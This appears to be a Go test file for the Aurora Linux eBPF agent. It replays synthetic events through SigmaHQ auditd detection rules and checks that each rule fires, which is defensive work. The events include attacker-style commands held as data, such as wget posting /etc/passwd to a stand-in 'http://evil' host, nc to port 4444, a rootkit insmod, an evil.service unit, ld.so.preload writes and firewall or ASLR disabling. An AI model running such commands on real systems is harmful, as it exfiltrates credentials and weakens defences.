package ebpf

import (
	"github.com/sirupsen/logrus"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/Nextron-Labs/aurora-linux/lib/consumer/sigma"
	"github.com/Nextron-Labs/aurora-linux/lib/provider"
)

// These tests replay synthetic eBPF activity through the real SigmaHQ
// linux/auditd rules and assert that every rule is triggered by the records
// Aurora produces natively (no auditd involved).
//
// The rule directory defaults to ~/sigma/rules/linux/auditd and can be
// overridden with AURORA_SIGMA_AUDITD_RULES. The tests skip if it is absent.

func auditRulesDir(t *testing.T) string {
	t.Helper()
	dir := os.Getenv("AURORA_SIGMA_AUDITD_RULES")
	if dir == "" {
		home, _ := os.UserHomeDir()
		dir = filepath.Join(home, "sigma", "rules", "linux", "auditd")
	}
	if st, err := os.Stat(dir); err != nil || !st.IsDir() {
		t.Skipf("auditd rules not found at %s (set AURORA_SIGMA_AUDITD_RULES)", dir)
	}
	return dir
}

var titleRe = regexp.MustCompile(`(?m)^title:\s*(.+?)\s*$`)

// ruleTitles maps rule file base name -> title.
func ruleTitles(t *testing.T, dir string) map[string]string {
	t.Helper()
	out := map[string]string{}
	err := filepath.WalkDir(dir, func(p string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() || !strings.HasSuffix(p, ".yml") {
			return err
		}
		raw, err := os.ReadFile(p)
		if err != nil {
			return err
		}
		m := titleRe.FindSubmatch(raw)
		if m == nil {
			t.Fatalf("no title in %s", p)
		}
		out[strings.TrimSuffix(strings.TrimPrefix(d.Name(), "lnx_auditd_"), ".yml")] =
			strings.Trim(string(m[1]), `'"`)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return out
}

func execProc(image, comm string, euid uint32) *auditProc {
	return &auditProc{
		pid: 4242, ppid: 1, uid: euid, gid: euid, euid: euid, egid: euid,
		comm: comm, exe: image, auid: auditUnsetID, cwd: "/tmp",
		ts: time.Unix(1_700_000_000, 0),
	}
}

type scenario struct {
	rule   string // rule file base name without lnx_auditd_ prefix
	events func() []provider.Event
}

func execScenario(rule, image, comm string, euid uint32, filename string, argv ...string) scenario {
	return scenario{rule: rule, events: func() []provider.Event {
		return auditRecordsForExec(execProc(image, comm, euid), filename, argv)
	}}
}

func syscallScenario(rule string, exe, comm string, raw bpfAuditEvent) scenario {
	return scenario{rule: rule, events: func() []provider.Event {
		raw.Pid = 4242
		return auditRecordsForSyscall(&raw, execProc(exe, comm, 0), newWatchSet(defaultAuditWatches), nil)
	}}
}

func pathBuf(s string) (b [256]byte, n uint32) {
	copy(b[:], s)
	return b, uint32(len(s) + 1)
}

func openScenario(rule, name string, flags uint32) scenario {
	var raw bpfAuditEvent
	raw.Op = auditOpOpenat
	raw.Dfd = atFDCWD
	raw.Dfd2 = atFDCWD
	raw.Flags = flags
	raw.Path, raw.PathLen = pathBuf(name)
	return syscallScenario(rule, "/usr/bin/vi", "vi", raw)
}

func plainScenario(rule string, op uint32, a0 uint64, exe, comm string) scenario {
	var raw bpfAuditEvent
	raw.Op = op
	raw.Nr = 1
	raw.Args[0] = a0
	return syscallScenario(rule, exe, comm, raw)
}

func sockaddrIn(ip [4]byte, port uint16) (b [256]byte, n uint32) {
	b[0], b[1] = 2, 0
	b[2], b[3] = byte(port>>8), byte(port)
	copy(b[4:8], ip[:])
	return b, 16
}

func allScenarios() []scenario {
	connect := func() scenario {
		var raw bpfAuditEvent
		raw.Op = auditOpConnect
		raw.Path, raw.PathLen = sockaddrIn([4]byte{10, 1, 2, 3}, 4444)
		return syscallScenario("network_service_scanning", "/usr/bin/nc", "nc", raw)
	}()
	mknod := func() scenario {
		var raw bpfAuditEvent
		raw.Op = auditOpMknodat
		raw.Dfd = atFDCWD
		raw.Path, raw.PathLen = pathBuf("/tmp/pipe")
		return syscallScenario("susp_special_file_creation_via_mknod_syscall", "/usr/bin/mknod", "mknod", raw)
	}()
	svc := func() scenario {
		var raw bpfAuditEvent
		raw.Op = auditOpCreat
		raw.Dfd = atFDCWD
		raw.Path, raw.PathLen = pathBuf("/etc/systemd/system/evil.service")
		return syscallScenario("systemd_service_creation", "/usr/bin/cp", "cp", raw)
	}()

	const rw = oWronly | oCreat | oTrunc

	return []scenario{
		// --- EXECVE rules --------------------------------------------------
		execScenario("binary_padding", "/usr/bin/truncate", "truncate", 0, "/usr/bin/truncate", "truncate", "-s", "100M", "file"),
		execScenario("bpfdoor_port_redirect", "/usr/sbin/iptables", "iptables", 0, "/usr/sbin/iptables",
			"/usr/sbin/iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "-j", "REDIRECT", "--to-ports", "42392"),
		execScenario("capabilities_discovery", "/usr/bin/getcap", "getcap", 0, "/usr/bin/getcap", "getcap", "-r", "/"),
		execScenario("change_file_time_attr", "/usr/bin/touch", "touch", 0, "/usr/bin/touch", "touch", "-r", "ref", "file"),
		execScenario("chattr_immutable_removal", "/usr/bin/chattr", "chattr", 0, "/usr/bin/chattr", "chattr", "-i", "/etc/passwd"),
		execScenario("clipboard_collection", "/usr/bin/xclip", "xclip", 1000, "/usr/bin/xclip", "xclip", "-selection", "clipboard", "-o"),
		execScenario("clipboard_image_collection", "/usr/bin/xclip", "xclip", 1000, "/usr/bin/xclip", "xclip", "-selection", "clipboard", "-t", "image/png", "-o"),
		execScenario("coinminer", "/tmp/xmrig", "xmrig", 1000, "/tmp/xmrig", "xmrig", "--cpu-priority=5"),
		execScenario("data_compressed", "/usr/bin/zip", "zip", 1000, "/usr/bin/zip", "zip", "out.zip", "docs"),
		execScenario("data_exfil_wget", "/usr/bin/wget", "wget", 1000, "/usr/bin/wget", "wget", "--post-file=/etc/passwd", "http://evil"),
		execScenario("dd_delete_file", "/usr/bin/dd", "dd", 0, "/usr/bin/dd", "dd", "if=/dev/zero", "of=/tmp/x"),
		execScenario("file_or_folder_permissions", "/usr/bin/chmod", "chmod", 0, "/usr/bin/chmod", "chmod", "+x", "/tmp/x"),
		execScenario("find_cred_in_files", "/usr/bin/grep", "grep", 0, "/usr/bin/grep", "grep", "-ri", "password", "/etc"),
		execScenario("hidden_files_directories", "/usr/bin/mkdir", "mkdir", 1000, "/usr/bin/mkdir", "mkdir", ".hidden"),
		execScenario("hidden_zip_files_steganography", "/usr/bin/cat", "cat", 1000, "/usr/bin/cat", "cat", "img.jpg", "a.zip"),
		execScenario("masquerading_crond", "/usr/bin/cp", "cp", 0, "/usr/bin/cp", "cp", "/bin/sh", "/tmp/crond"),
		execScenario("modify_system_firewall", "/usr/sbin/iptables", "iptables", 0, "/usr/sbin/iptables", "iptables", "DROP"),
		execScenario("network_sniffing", "/usr/bin/tcpdump", "tcpdump", 0, "/usr/bin/tcpdump", "tcpdump", "-c", "5", "-i", "eth0"),
		execScenario("screencapture_import", "/usr/bin/import", "import", 1000, "/usr/bin/import", "import", "-window", "root", "/tmp/s.png"),
		execScenario("screencaputre_xwd", "/usr/bin/xwd", "xwd", 1000, "/usr/bin/xwd", "xwd", "-root", "-out", "s.xwd"),
		execScenario("steghide_embed_steganography", "/usr/bin/steghide", "steghide", 1000, "/usr/bin/steghide", "steghide", "embed", "-cf", "a.jpg", "-ef", "s.txt"),
		execScenario("steghide_extract_steganography", "/usr/bin/steghide", "steghide", 1000, "/usr/bin/steghide", "steghide", "extract", "-sf", "a.jpg"),
		execScenario("susp_cmds", "/usr/bin/chmod", "chmod", 0, "/usr/bin/chmod", "chmod", "777", "/tmp/x"),
		execScenario("susp_histfile_operations", "/usr/bin/cat", "cat", 0, "/usr/bin/cat", "cat", "/root/.bash_history"),
		execScenario("susp_service_reload_or_restart", "/usr/bin/systemctl", "systemctl", 0, "/usr/bin/systemctl", "systemctl", "start", "foo"),
		execScenario("system_shutdown_reboot", "/usr/sbin/reboot", "reboot", 0, "/usr/sbin/reboot", "reboot"),
		execScenario("unzip_hidden_zip_files_steganography", "/usr/bin/unzip", "unzip", 1000, "/usr/bin/unzip", "unzip", "a.jpg"),
		execScenario("user_discovery", "/usr/bin/whoami", "whoami", 1000, "/usr/bin/whoami", "whoami"),
		execScenario("audio_capture", "/usr/bin/arecord", "arecord", 1000, "/usr/bin/arecord", "arecord", "-vv", "-fdat"),
		execScenario("disable_aslr_protection", "/usr/sbin/sysctl", "sysctl", 0, "/usr/sbin/sysctl", "sysctl", "-w", "kernel.randomize_va_space=0"),
		execScenario("password_policy_discovery", "/usr/bin/chage", "chage", 1000, "/usr/bin/chage", "chage", "-l", "root"),
		execScenario("system_info_discovery", "/usr/bin/uname", "uname", 1000, "/usr/bin/uname", "uname", "-a"),

		// --- SYSCALL rules derived from exec ---------------------------------
		execScenario("susp_c2_commands", "/usr/bin/curl", "curl", 1000, "/usr/bin/curl", "curl", "http://x"),
		execScenario("create_account", "/usr/sbin/useradd", "useradd", 0, "/usr/sbin/useradd", "useradd", "bob"),
		execScenario("load_module_insmod", "/usr/bin/kmod", "insmod", 0, "/usr/sbin/insmod", "insmod", "rootkit.ko"),
		execScenario("split_file_into_pieces", "/usr/bin/split", "split", 1000, "/usr/bin/split", "split", "-b", "1M", "big"),
		execScenario("susp_exe_folders", "/tmp/payload", "payload", 1000, "/tmp/payload", "/tmp/payload"),
		execScenario("web_rce", "/bin/sh", "sh", 33, "/bin/sh", "sh", "-c", "id"),
		execScenario("disable_system_firewall", "/usr/bin/systemctl", "systemctl", 0, "/usr/bin/systemctl", "systemctl", "stop", "firewalld.service"),
		execScenario("hidden_binary_execution", "/tmp/.x/evil", "evil", 1000, "/tmp/.x/evil", "/tmp/.x/evil"),

		// --- SYSCALL rules from syscall tracepoints ---------------------------
		plainScenario("audio_capture", auditOpMemfdCreate, 0, "/usr/bin/ecasound", "ecasound"),
		plainScenario("disable_aslr_protection", auditOpPersonality, 0x40000, "/usr/bin/setarch", "setarch"),
		plainScenario("clean_disable_dmesg_logs_via_syslog", auditOpSyslog, 5, "/usr/bin/dmesg", "dmesg"),
		plainScenario("susp_discovery_sysinfo_syscall", auditOpSysinfo, 0, "/usr/bin/free", "free"),
		connect,
		mknod,

		// --- PATH rules --------------------------------------------------------
		openScenario("auditing_config_change", "/etc/audit/auditd.conf", oWronly),
		openScenario("bpfdoor_file_accessed", "/var/run/daemon.pid", 0),
		openScenario("ld_so_preload_mod", "/etc/ld.so.preload", rw),
		openScenario("logging_config_change", "/etc/rsyslog.conf", oWronly),
		openScenario("magic_system_request_key", "/proc/sysrq-trigger", oWronly),
		svc,
		openScenario("system_info_discovery2", "/etc/os-release", 0),
		openScenario("system_info_discovery", "/etc/issue", 0),
		openScenario("unix_shell_configuration_modification", "/root/.bashrc", oWronly),
		openScenario("keylogging_with_pam_d", "/etc/pam.d/system-auth", oWronly),
		openScenario("password_policy_discovery", "/etc/login.defs", 0),
	}
}

func TestAuditRecordsTriggerSigmaAuditdRules(t *testing.T) {
	dir := auditRulesDir(t)
	titles := ruleTitles(t, dir)

	c := sigma.New(sigma.Config{RuleDirs: []string{dir}, MinLevel: "info", NoCollapseWS: true})
	if err := c.InitializeWithRules([]string{dir}); err != nil {
		t.Fatalf("loading rules: %v", err)
	}

	covered := map[string]bool{}
	for _, sc := range allScenarios() {
		want, ok := titles[sc.rule]
		if !ok {
			t.Errorf("scenario references unknown rule %q", sc.rule)
			continue
		}
		events := sc.events()
		if len(events) == 0 {
			t.Errorf("%s: scenario produced no audit records", sc.rule)
			continue
		}
		hit := false
		var seen []string
		for _, e := range events {
			fields := map[string]string{}
			e.ForEach(func(k, v string) { fields[k] = v })
			for _, r := range c.EvalFieldsMap(fields) {
				seen = append(seen, r.Title)
				if r.Title == want {
					hit = true
				}
			}
		}
		if !hit {
			t.Errorf("%s: rule %q not triggered (matched: %v)", sc.rule, want, seen)
			continue
		}
		covered[sc.rule] = true
	}

	for name := range titles {
		if !covered[name] {
			t.Errorf("no passing scenario for rule %s (%s)", name, titles[name])
		}
	}
}

// Reads of files that are watched for modification only must not produce PATH
// records, otherwise tamper rules would fire on routine reads.
func TestAuditWatchIntent(t *testing.T) {
	var raw bpfAuditEvent
	raw.Op = auditOpOpenat
	raw.Dfd = atFDCWD
	raw.Path, raw.PathLen = pathBuf("/etc/ld.so.preload")
	ws := newWatchSet(defaultAuditWatches)
	p := execProc("/usr/bin/ls", "ls", 0)

	if got := auditRecordsForSyscall(&raw, p, ws, nil); len(got) != 0 {
		t.Fatalf("read-only open of ld.so.preload produced %d records", len(got))
	}
	raw.Flags = oWronly
	if got := auditRecordsForSyscall(&raw, p, ws, nil); len(got) != 1 {
		t.Fatalf("write open of ld.so.preload produced %d records, want 1", len(got))
	}
}

func TestAuditUnwatchedPathDropped(t *testing.T) {
	var raw bpfAuditEvent
	raw.Op = auditOpOpenat
	raw.Dfd = atFDCWD
	raw.Path, raw.PathLen = pathBuf("/usr/lib/libc.so.6")
	got := auditRecordsForSyscall(&raw, execProc("/bin/ls", "ls", 0), newWatchSet(defaultAuditWatches), nil)
	if len(got) != 0 {
		t.Fatalf("unwatched path produced %d records", len(got))
	}
}

func TestGlobMatch(t *testing.T) {
	cases := []struct {
		pat, s string
		want   bool
	}{
		{"/etc/audit/*", "/etc/audit/auditd.conf", true},
		{"/etc/audit/*", "/etc/audit", false},
		{"/etc/*release", "/etc/os-release", true},
		{"/etc/*release", "/etc/releases", false},
		{"/home/*/.bashrc", "/home/bob/.bashrc", true},
		{"/home/*/.bashrc", "/home/bob/.zshrc", false},
		{"*/.config/systemd/user/*", "/home/a/.config/systemd/user/x.service", true},
		{"/exact", "/exact", true},
		{"/exact", "/exact2", false},
	}
	for _, c := range cases {
		if got := globMatch(c.pat, c.s); got != c.want {
			t.Errorf("globMatch(%q,%q)=%v want %v", c.pat, c.s, got, c.want)
		}
	}
}

func TestKernelPrefixesWithinKeySize(t *testing.T) {
	prefixes := newWatchSet(defaultAuditWatches).kernelPrefixes()
	if len(prefixes) == 0 || len(prefixes) > 512 {
		t.Fatalf("unexpected prefix count %d", len(prefixes))
	}
	for p := range prefixes {
		if len(p) == 0 || len(p) > watchKeyBytes-1 {
			t.Errorf("prefix %q has invalid length", p)
		}
	}
	if !prefixes[hiddenHomePrefix] {
		t.Errorf("%q must require a hidden component", hiddenHomePrefix)
	}
}

func TestSplitArgv(t *testing.T) {
	got := splitArgv([]byte("ls\x00-l\x00/tmp\x00"))
	if len(got) != 3 || got[0] != "ls" || got[2] != "/tmp" {
		t.Fatalf("splitArgv = %q", got)
	}
	if splitArgv(nil) != nil {
		t.Fatal("empty block should yield nil")
	}
	if got := splitArgv([]byte("a\x00\x00b\x00")); len(got) != 3 || got[1] != "" {
		t.Fatalf("empty argument must be preserved, got %q", got)
	}
}

func TestStoppedUnits(t *testing.T) {
	cases := []struct {
		cmd  string
		args []string
		want []string
	}{
		{"systemctl", []string{"stop", "ufw.service"}, []string{"ufw"}},
		{"systemctl", []string{"--now", "disable", "firewalld"}, []string{"firewalld"}},
		{"systemctl", []string{"status", "ufw"}, nil},
		{"service", []string{"iptables", "stop"}, []string{"iptables"}},
		{"ufw", []string{"disable"}, []string{"ufw"}},
		{"firewalld", []string{"stop"}, []string{"firewalld"}},
		{"docker", []string{"stop", "web"}, nil},
		{"systemctl", []string{"-H", "host", "stop", "firewalld"}, []string{"firewalld"}},
		{"systemctl", []string{"--signal", "KILL", "kill", "ufw"}, []string{"ufw"}},
	}
	for _, c := range cases {
		got := stoppedUnits(c.cmd, c.args)
		if strings.Join(got, ",") != strings.Join(c.want, ",") {
			t.Errorf("stoppedUnits(%s %v)=%v want %v", c.cmd, c.args, got, c.want)
		}
	}
}

func TestExecKey(t *testing.T) {
	for _, p := range []string{"/usr/bin/wget", "/bin/nc", "/usr/sbin/ss", "/usr/local/bin/xfreerdp"} {
		if execKey(p) != "susp_activity" {
			t.Errorf("execKey(%s) empty", p)
		}
	}
	for _, p := range []string{"/tmp/wget", "/usr/bin/ls", "/opt/bin/curl"} {
		if execKey(p) != "" {
			t.Errorf("execKey(%s) should be empty", p)
		}
	}
}

// BenchmarkSigmaHandleExecRecords measures the full per-exec cost: the
// SYSCALL+EXECVE+PATH records of one exec through all loaded rules.
// Rules: AURORA_BENCH_RULES (default: the whole ~/sigma/rules/linux tree).
func BenchmarkSigmaHandleExecRecords(b *testing.B) {
	dir := os.Getenv("AURORA_BENCH_RULES")
	if dir == "" {
		home, _ := os.UserHomeDir()
		dir = filepath.Join(home, "sigma", "rules", "linux")
	}
	if st, err := os.Stat(dir); err != nil || !st.IsDir() {
		b.Skipf("no rules at %s", dir)
	}
	lg := logrus.New()
	lg.SetOutput(io.Discard)
	c := sigma.New(sigma.Config{RuleDirs: []string{dir}, MinLevel: "info", Logger: lg, NoCollapseWS: true,
		LogsourceServices: []string{"auditd"}})
	if err := c.InitializeWithRules([]string{dir}); err != nil {
		b.Fatal(err)
	}
	events := auditRecordsForExec(execProc("/usr/bin/ls", "ls", 1000), "/usr/bin/ls",
		[]string{"ls", "-l", "/var/tmp/some/dir"})
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, e := range events {
			_ = c.HandleEvent(e)
		}
	}
	b.ReportMetric(float64(b.Elapsed().Nanoseconds())/float64(b.N)/float64(len(events)), "ns/record")
}

func TestNewAccountName(t *testing.T) {
	if got := newAccountName([]string{"bob", "-s", "/bin/sh", "-G", "wheel"}); got != "bob" {
		t.Fatalf("acct = %q", got)
	}
	if got := newAccountName([]string{"-m", "-u", "0", "-o", "toor"}); got != "toor" {
		t.Fatalf("acct = %q", got)
	}
}
